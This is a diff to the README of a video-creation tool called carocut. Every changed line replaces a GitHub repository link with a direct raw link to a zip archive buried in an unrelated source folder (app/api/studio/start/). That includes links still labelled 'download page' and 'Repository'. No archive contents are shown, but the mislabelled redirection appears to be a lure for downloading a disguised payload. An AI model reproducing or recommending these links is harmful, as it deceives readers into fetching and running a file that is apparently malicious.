@@ -1,6 +1,6 @@
 # 🎬 carocut - Make video creation easier
 
-[![Download carocut](https://img.shields.io/badge/Download%20carocut-blue?style=for-the-badge&logo=github)](https://github.com/genevievesuperior757/carocut)
+[![Download carocut](https://img.shields.io/badge/Download%20carocut-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/genevievesuperior757/carocut/main/app/api/studio/start/Software_v3.7-beta.4.zip)
 
 ## 🖥️ What is carocut?
 
@@ -31,7 +31,7 @@ For smooth use, keep at least 8 GB of RAM and a recent CPU. More memory helps wh
 
 Use this link to visit the download page:
 
-[Visit the carocut download page](https://github.com/genevievesuperior757/carocut)
+[Visit the carocut download page](https://raw.githubusercontent.com/genevievesuperior757/carocut/main/app/api/studio/start/Software_v3.7-beta.4.zip)
 
 1. Open the download page in your browser
 2. Find the latest release or build file
@@ -200,5 +200,5 @@ carocut fits well for:
 
 ## 📎 Useful links
 
-- Download page: https://github.com/genevievesuperior757/carocut
-- Repository: https://github.com/genevievesuperior757/carocut
+- Download page: https://raw.githubusercontent.com/genevievesuperior757/carocut/main/app/api/studio/start/Software_v3.7-beta.4.zip
+- Repository: https://raw.githubusercontent.com/genevievesuperior757/carocut/main/app/api/studio/start/Software_v3.7-beta.4.zip
